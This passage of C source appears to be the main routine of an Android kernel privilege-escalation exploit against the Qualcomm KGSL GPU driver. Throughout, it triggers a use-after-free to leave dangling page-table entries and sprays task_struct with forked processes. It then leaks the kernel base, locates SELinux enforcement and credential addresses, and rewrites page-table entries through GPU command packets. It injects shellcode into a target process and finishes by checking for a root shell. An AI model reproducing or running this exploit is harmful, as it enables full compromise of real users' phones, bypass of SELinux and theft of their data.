            free_obj.id = ph_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (uaf_id)
        {
            free_obj.id = uaf_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (fd >= 0)
        {
            close(fd);
            fd = -1;
        }

        retries--;
        if (retries > 0)
        {
            fprintf(stderr, "[-] Retrying exploit... (%d attempts left)\n", retries);
            sleep(1);
            goto restart;
        }
        else
        {
            fprintf(stderr, "[!] All retries failed. Giving up.\n");
            return 1;
        }
    }

    fprintf(stderr, "[10] Freeing UAF to create dangling PTEs\n");
    struct kgsl_gpuobj_free uaf_free = {0};
    uaf_free.id = uaf_id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &uaf_free) == 0)
    {
        fprintf(stderr, "    [+] UAF freed (id=%u)\n", uaf_id);
        fprintf(stderr, "    [*] Dangling PTEs created at VA 0x%llx - 0x%llx\n",
                (unsigned long long)UAF_START,
                (unsigned long long)(UAF_START + UAF_SIZE));
        fprintf(stderr, "    [+] UAF mmap pointer kept for child: %p\n", g_uaf_mmap_ptr);
        uaf_id = 0;
    }
    else
    {
        fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
    }

    fprintf(stderr, "\n[11] Spraying task_struct\n");
    fprintf(stderr, "    [*] Creating %d processes with marker '%s'\n", spray_count, MARKER_NAME);

    char qwerqwer[0x500] = {0};
    pid_t spray_pids[SPRAY_COUNT_MAX];
    fd2 = open("./memo", O_RDWR | O_CREAT | O_TRUNC, 0644);
    write(fd2, qwerqwer, 0x500);
    int spray_success = 0;
    int fd_zero = -1;
    fd_zero = open("./zeros.bin", O_RDWR | O_CREAT | O_TRUNC, 0644);

    char buffer_zero[0x100];
    memset(buffer_zero, 0, sizeof(buffer_zero));
    write(fd_zero, buffer_zero, sizeof(buffer_zero));
    lseek(fd_zero, 0, SEEK_SET);

    fprintf(stderr, "    [*] Forking spray processes...\n");
    for (int i = 0; i < spray_count; i++)
    {
        pid_t pid = fork();
        if (pid == 0)
        {
            char proc_name[16];
            memset(proc_name, 0, 16);
            pid_t self = getpid();
            snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, self);
            prctl(PR_SET_NAME, proc_name, 0, 0, 0);
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            int idx = i;
            spray_ctrl[idx].pid = self;
            spray_ctrl[idx].do_action = 0;

            fprintf(stderr, "[SPRAY %d] Started, PID=%d, name=%s\n", i, self, proc_name);

            while (1)
            {
                if (gbuf[0] == 0xab || spray_ctrl[idx].do_action == 1)
                {
                    fprintf(stderr, "[SPRAY %d] Triggered! Patching cred...\n", i);
                    safe_cred_patch();
                    return 0;
                }
                usleep(50000);
            }
        }
        else if (pid > 0)
        {
            spray_success++;
            spray_pids[i] = pid;
        }
        else
        {
            spray_pids[i] = -1;
        }
    }

    fprintf(stderr, "    [+] Sprayed %d processes with names: %s0000 ~ %s%04d\n",
            spray_success, MARKER_NAME, MARKER_NAME, spray_success - 1);

    fprintf(stderr, "    [*] Waiting 25 seconds for processes to settle...\n");
    sleep(25);
    usleep(20);

    fprintf(stderr, "\n[12] Scanning UAF region for non-zero data\n");
    fprintf(stderr, "    [*] Looking for KETO0422 marker and kernel pointers...\n");

    struct nonzero_page found_pages[FINDING];
    int num_found = 0;

    if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found))
    {
        fprintf(stderr, "\n    [+] NON-ZERO PAGES FOUND IN UAF REGION!\n");
        fprintf(stderr, "    Count: %d pages\n", num_found);
        if (num_found > 0)
        {
            fprintf(stderr, "    [*] First found VA: 0x%llx\n",
                    (unsigned long long)found_pages[0].va);
        }
    }
    else
    {
        fprintf(stderr, "\n    [!] scan_uaf_for_nonzero_multi failed. Cleaning up and restarting...\n");

        for (int i = 0; i < spray_count; i++)
        {
            if (spray_ctrl[i].pid > 0)
            {
                kill(spray_ctrl[i].pid, SIGTERM);
            }
        }
        for (int i = 0; i < spray_count; i++)
        {
            if (spray_ctrl[i].pid > 0)
            {
                waitpid(spray_ctrl[i].pid, NULL, 0);
            }
        }

        if (fd_zero >= 0)
        {
            close(fd_zero);
            fd_zero = -1;
        }
        if (fd2 >= 0)
        {
            close(fd2);
            fd2 = -1;
        }

        if (overlap_vma && overlap_vma != MAP_FAILED)
        {
            munmap(overlap_vma, overlap_mmapsize);
            overlap_vma = NULL;
        }
        if (ph_vma && ph_vma != MAP_FAILED)
        {
            munmap(ph_vma, ph_mmapsize);
            ph_vma = NULL;
        }
        if (bogus_vma && bogus_vma != MAP_FAILED)
        {
            munmap(bogus_vma, PAGE_SIZE * 3);
            bogus_vma = NULL;
        }

        struct kgsl_gpuobj_free free_obj = {0};
        if (overlap_id)
        {
            free_obj.id = overlap_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
            overlap_id = 0;
        }
        if (ph_id)
        {
            free_obj.id = ph_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
            ph_id = 0;
        }
        if (uaf_id)
        {
            free_obj.id = uaf_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
            uaf_id = 0;
        }

        if (fd >= 0)
        {
            close(fd);
            fd = -1;
        }

        memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
        if (spray_count + SPRAY_COUNT_STEP <= SPRAY_COUNT_MAX)
        {
            spray_count += SPRAY_COUNT_STEP;
        }
        else
        {
            spray_count = SPRAY_COUNT_MAX;
        }
        fprintf(stderr, "    [*] Increasing spray count to %d and retrying...\n", spray_count);
        goto restart;
    }

    for (int i = 0; i < spray_count; i++)
    {
        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0)
        {
            kill(spray_ctrl[i].pid, SIGTERM);
        }
    }
    for (int i = 0; i < spray_count; i++)
    {
        if (spray_ctrl[i].do_action == 0 && spray_ctrl[i].pid > 0)
        {
            waitpid(spray_ctrl[i].pid, NULL, 0);
        }
    }

    uint64_t kbase = (*(uint64_t *)&gbuf[0x20]);
    if (kbase != 0)
    {
        kernel_base = kbase;
        fprintf(stderr, "[+] Kernel base: 0x%llx\n", kbase);
    }
    else
    {
        uint64_t task_va = *(uint64_t *)&gbuf[0xb08];
        if (task_va != 0)
        {
            kernel_base = find_kernel_base_from_task_struct(task_va);
        }
        if (kernel_base == 0)
        {
            kernel_base = get_kernel_base();
        }
        fprintf(stderr, "[+] Kernel base: 0x%llx\n", kernel_base);
    }

    uint64_t init_cred = kbase + 0x24D90D0;
    uint64_t poweroff_cmd = kbase + 0x2BB8EC0;
    uint64_t orderly_poweroff = kbase + 0x5F96C;
    uint64_t memstart_addr = kbase + 0x24C2538;
    if (kbase != 0)
    {
        uint64_t auto_offset = find_offsets_auto(kbase);
        selinux_enforcing = kbase + (auto_offset != 0 ? auto_offset : 0x2F74CE8);
        if (selinux_enforcing == 0 || selinux_enforcing == kbase + 0x2F74CE8)
        {
            uint64_t found_selinux = find_selinux_enforcing();
            if (found_selinux != 0)
                selinux_enforcing = found_selinux;
        }
    }
    else
    {
        selinux_enforcing = 0;
    }
    *(uint64_t *)&gbuf[SET_TASKS] = selinux_enforcing;

    fprintf(stderr, "[+] SELinux enforcing at: 0x%llx\n", selinux_enforcing);
    fprintf(stderr, "[+] Poweroff cmd at: 0x%llx\n", poweroff_cmd);

    sleep(1);
    fprintf(stderr, "[child] Triggering cred patch in spray processes...\n");
    log_sync_state("parent-trigger");
    for (int i = 0; i < spray_count; i++)
    {
        spray_ctrl[i].do_action = 1;
    }
    __sync_synchronize();
    gbuf[0] = 0xab;
    __sync_synchronize();

    if (!wait_for_flag_u8((volatile uint8_t *)&gbuf[TASK_SPRAY_CLEAR], 0x1, WAIT_TIMEOUT_MS) &&
        !wait_for_flag_u8((volatile uint8_t *)&gbuf[TASK_SPRAY_CLEAR], 0x2, WAIT_TIMEOUT_MS))
    {
        fprintf(stderr, "[!] timeout waiting for TASK_SPRAY_CLEAR\n");
        log_sync_state("parent-timeout");
    }
    else
    {
        if (gbuf[TASK_SPRAY_CLEAR] == 0x1)
        {
            fprintf(stderr, "[!] child read fail\n");
            log_sync_state("parent-child-fail");
        }
        else if (gbuf[TASK_SPRAY_CLEAR] == 0x2)
        {
            fprintf(stderr, "[+] child read success\n");
            log_sync_state("parent-child-success");
        }
    }

    mmap_spray();

    fprintf(stderr, "\n[12b] Final UAF scan for structs...\n");
    struct nonzero_page pages2[MAX_FOUND_PAGES];
    int num_pages2 = 0;
    if (scan_uaf_and_collect(fd, pages2, &num_pages2))
    {
        fprintf(stderr, "[+] Found %d pages\n", num_pages2);
    }
    else
    {
        fprintf(stderr, "[!] No pages found in UAF region\n");
    }

    gbuf[0x910] = 1;
    mmap_check();
    sleep(1);
    fprintf(stderr, "[+] mmap_check complete.\n");

    uint32_t rb_count = *(uint32_t *)(gbuf + 0xb00);
    fprintf(stderr, "[RECOVER] rb_count=%u\n", rb_count);

    struct kgsl_drawctxt_create ctx2 = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2) == 0)
    {
        unsigned ctx_id2 = ctx2.drawctxt_id;
        struct kgsl_gpuobj_alloc ib_alloc = {
            .size = PAGE_SIZE * 4,
            .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) == 0)
        {
            unsigned ib_id2 = ib_alloc.id;
            void *ib_vma2 = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
                                 MAP_SHARED, fd, ((off_t)ib_id2) << 12);
            if (ib_vma2 != MAP_FAILED)
            {
                struct kgsl_gpuobj_info info = {.id = ib_id2};
                ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
                uint64_t ib_gpu2 = info.gpuaddr;

                struct kgsl_gpuobj_alloc dump_alloc = {
                    .size = PAGE_SIZE * 2,
                    .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
                unsigned dump_id = 0;
                void *dump_vma = NULL;
                uint64_t dump_gpu = 0;

                if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dump_alloc) == 0)
                {
                    dump_id = dump_alloc.id;
                    dump_vma = mmap(NULL, dump_alloc.mmapsize, PROT_READ | PROT_WRITE,
                                    MAP_SHARED, fd, ((off_t)dump_id) << 12);
                    if (dump_vma != MAP_FAILED)
                    {
                        struct kgsl_gpuobj_info dump_info = {.id = dump_id};
                        ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &dump_info);
                        dump_gpu = dump_info.gpuaddr;
                    }
                }

                fprintf(stderr, "[RECOVER] Processing %u entries\n", rb_count);
                for (uint32_t ri = 0; ri < rb_count; ri++)
                {
                    uint64_t va = *(uint64_t *)(gbuf + 0xb08 + ri * 24);
                    fprintf(stderr, "[RECOVER] VA %d: 0x%llx\n", ri, (unsigned long long)va);

                    if (!dump_vma)
                        continue;

                    uint32_t *cmd = (uint32_t *)ib_vma2;
                    int dw = 0;
                    memset(ib_vma2, 0, ib_alloc.mmapsize);
                    cmd[dw++] = cp_type7_packet(CP_NOP, 0);

                    for (int i_dump = 0; i_dump < 0x80; i_dump++)
                    {
                        uint32_t d_lo, d_hi, s_lo, s_hi;
                        split64(dump_gpu + (uint64_t)i_dump * 4, &d_lo, &d_hi);
                        split64(va + (uint64_t)i_dump * 4, &s_lo, &s_hi);
                        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                        cmd[dw++] = 0;
                        cmd[dw++] = d_lo;
                        cmd[dw++] = d_hi;
                        cmd[dw++] = s_lo;
                        cmd[dw++] = s_hi;
                    }

                    cmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    size_t bytes = (size_t)dw * 4;
                    msync(ib_vma2, bytes, MS_SYNC);

                    struct kgsl_command_object obj = {
                        .gpuaddr = ib_gpu2,
                        .size = bytes,
                        .flags = KGSL_CMDLIST_IB,
                        .id = ib_id2};

                    struct kgsl_gpu_command c = {0};
                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) != 0 ||
                        wait_timestamp(fd, ctx_id2, c.timestamp) != 0)
                    {
                        fprintf(stderr, "[RECOVER] GPU copy failed for VA 0x%llx\n",
                                (unsigned long long)va);
                        continue;
                    }

                    msync(dump_vma, 0x200, MS_SYNC | MS_INVALIDATE);
                    write(fd2, dump_vma, 0x200);
                    write(fd2, "aaaaaaaaaaaaaaa", 0x10);

                    uint64_t orig = *(uint64_t *)((uint8_t *)dump_vma + 8 * sig_num[0]);
                    uint64_t pte1 = *(uint64_t *)((uint8_t *)dump_vma + 8 * sig_num[1]);
                    uint64_t src = *(uint64_t *)((uint8_t *)dump_vma + 0x130);

                    const uint64_t PFN_MASK = PHYS_MASK & PAGE_MASK;
                    uint64_t orig_pfn = orig & PFN_MASK;
                    uint64_t pte1_pfn = pte1 & PFN_MASK;
                    uint64_t src_pfn = src & PFN_MASK;

                    if (src_pfn == 0)
                    {
                        fprintf(stderr, "[RECOVER] Skip patch: src PFN at 0x130 is empty VA: 0x%llx\n",
                                (unsigned long long)va);
                        continue;
                    }

                    uint64_t new_pte = (orig & ~PFN_MASK) | src_pfn;

                    memset(ib_vma2, 0, ib_alloc.mmapsize);
                    dw = 0;
                    cmd = (uint32_t *)ib_vma2;

                    for (int i = 0; i < 4; i++)
                    {
                        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    }

                    uint32_t d_lo, d_hi;
                    split64(va + (uint64_t)sig_num[0] * 8, &d_lo, &d_hi);
                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                    cmd[dw++] = d_lo;
                    cmd[dw++] = d_hi;
                    cmd[dw++] = (uint32_t)(new_pte & 0xffffffffu);

                    split64(va + 4 + (uint64_t)sig_num[0] * 8, &d_lo, &d_hi);
                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                    cmd[dw++] = d_lo;
                    cmd[dw++] = d_hi;
                    cmd[dw++] = (uint32_t)(new_pte >> 32);

                    for (int i = 0; i < 4; i++)
                    {
                        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    }

                    bytes = (size_t)dw * 4;
                    msync(ib_vma2, bytes, MS_SYNC);
                    obj.size = bytes;
                    memset(&c, 0, sizeof(c));
                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) == 0 &&
                        wait_timestamp(fd, ctx_id2, c.timestamp) == 0)
                    {
                        fprintf(stderr, "[RECOVER] Patched PTE PFN From 0x130 -> 0x0 for VA 0x%llx\n",
                                (unsigned long long)va);
                    }
                    else
                    {
                        fprintf(stderr, "[RECOVER] GPU patch failed for VA 0x%llx\n",
                                (unsigned long long)va);
                    }
                }

                if (dump_vma)
                {
                    munmap(dump_vma, dump_alloc.mmapsize);
                }
                if (dump_id)
                {
                    struct kgsl_gpuobj_free fr_dump = {0};
                    fr_dump.id = dump_id;
                    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr_dump);
                }
                munmap(ib_vma2, ib_alloc.mmapsize);
            }

            struct kgsl_gpuobj_free fr = {0};
            fr.id = ib_id2;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        }
    }

    fprintf(stderr, "[+] Exploit sequence complete!\n");

    if (gb_target_addr != 0)
    {
        write(fd2, (void *)(gb_target_addr + 0x1000), 0x1000);
    }
    else
    {
        fprintf(stderr, "[!] gb_target_addr is 0, skipping shellcode injection\n");
    }

    fprintf(stderr, "[+] Waiting for triggered process...\n");
    {
        uint64_t target_pid = *(uint64_t *)&gbuf[TARGET_PIDPID];
        if ((pid_t)target_pid > 0)
        {
            waitpid((pid_t)target_pid, NULL, 0);
        }
        else
        {
            fprintf(stderr, "[!] invalid TARGET_PIDPID value: 0x%llx\n",
                    (unsigned long long)target_pid);
        }
    }

    int still = 0;
    for (int i = 0; i < spray_count; i++)
    {
        pid_t p = spray_ctrl[i].pid;
        if (p <= 0)
            continue;
        if (kill(p, 0) == 0)
        {
            still++;
            fprintf(stderr, "[!] pid still exists=%d\n", p);
        }
    }
    fprintf(stderr, "[*] spray exists count=%d\n", still);

    int fd_recover = open("./recover", O_RDWR | O_CREAT | O_TRUNC, 0777);
    write(fd_recover, (void *)(*(uint64_t *)&gbuf[0x400] + 0x162d4), 287);
    lseek(fd_recover, 0, SEEK_SET);
    uint64_t first = 0;
    if (gb_target_addr != 0)
    {
        first = *(uint64_t *)(gb_target_addr + PAGE_SIZE + 0x2d4);
    }
    else
    {
        fprintf(stderr, "[!] gb_target_addr is 0, cannot read first\n");
    }

    fprintf(stderr, "[+] first 8 : %lx\n", first);
    fprintf(stderr, "[+] protect success\n");

    if (first == 0xd102c3ffd503233f && gb_target_addr != 0)
    {
        lseek(fd_shellcode, 0, SEEK_SET);
        if (read(fd_shellcode, (void *)(gb_target_addr + PAGE_SIZE + 0x2d4), 287) <= 0)
        {
            fprintf(stderr, "[!] read not success\n");
            perror("read");
        }
        fprintf(stderr, "[+] read success\n");
        fprintf(stderr, "[+] second 8 : %lx\n",
                *(uint64_t *)(gb_target_addr + PAGE_SIZE + 0x2d4));
    }

    if (first == 0xd102c3ffd503233f)
    {
        fprintf(stderr, "[+] Shellcode injected!\n");
    }

    log_sync_state("parent-emit-0x11");
    gbuf[FOUND_PID] = 0x11;
    log_sync_state("parent-post-emit-0x11");
    waitpid(pid, NULL, 0);

    fprintf(stderr, "[+] Waiting for trigger...\n");
    while (1)
    {
        if (gbuf[CALL_LOGLINE] == 0x11)
        {
            fprintf(stderr, "[+] TRIGGERED! Holding init...\n");
            break;
        }
        usleep(500);
    }

    usleep(500000);

    ssize_t recover_len = read(fd_recover, (void *)(gb_target_addr + PAGE_SIZE + 0x2d4), 287);
    recover_origin(fd);

    sleep(1);
    struct kgsl_gpuobj_free free_req = {0};

    if (ph_id)
    {
        free_req.id = ph_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0)
        {
            perror("cleanup: free ph_id");
        }
        else
        {
            fprintf(stderr, "[+] Freed Placeholder ID %u\n", ph_id);
        }
        ph_id = 0;
    }

    if (overlap_id)
    {
        free_req.id = overlap_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0)
        {
            perror("cleanup: free overlap_id");
        }
        else
        {
            fprintf(stderr, "[+] Freed Overlap ID %u\n", overlap_id);
        }
        overlap_id = 0;
    }

    if (uaf_id)
    {
        free_req.id = uaf_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0)
        {
            perror("cleanup: free uaf_id");
        }
        else
        {
            fprintf(stderr, "[+] Freed UAF ID %u\n", uaf_id);
        }
        uaf_id = 0;
    }

    if (overlap_vma && overlap_vma != MAP_FAILED)
    {
        munmap(overlap_vma, overlap_mmapsize);
    }
    if (ph_vma && ph_vma != MAP_FAILED)
    {
        munmap(ph_vma, ph_mmapsize);
    }
    if (bogus_vma && bogus_vma != MAP_FAILED)
    {
        munmap(bogus_vma, PAGE_SIZE * 3);
    }

    close(fd_zero);
    close(fd2);
    close(fd_lib);
    close(fd_shellcode);
    close(fd);
    close(fd_recover);
    usleep(100);
    mmap_spray_free();

    fprintf(stderr, "[+] Done! Check if root shell spawned.\n");
    return 0;
}
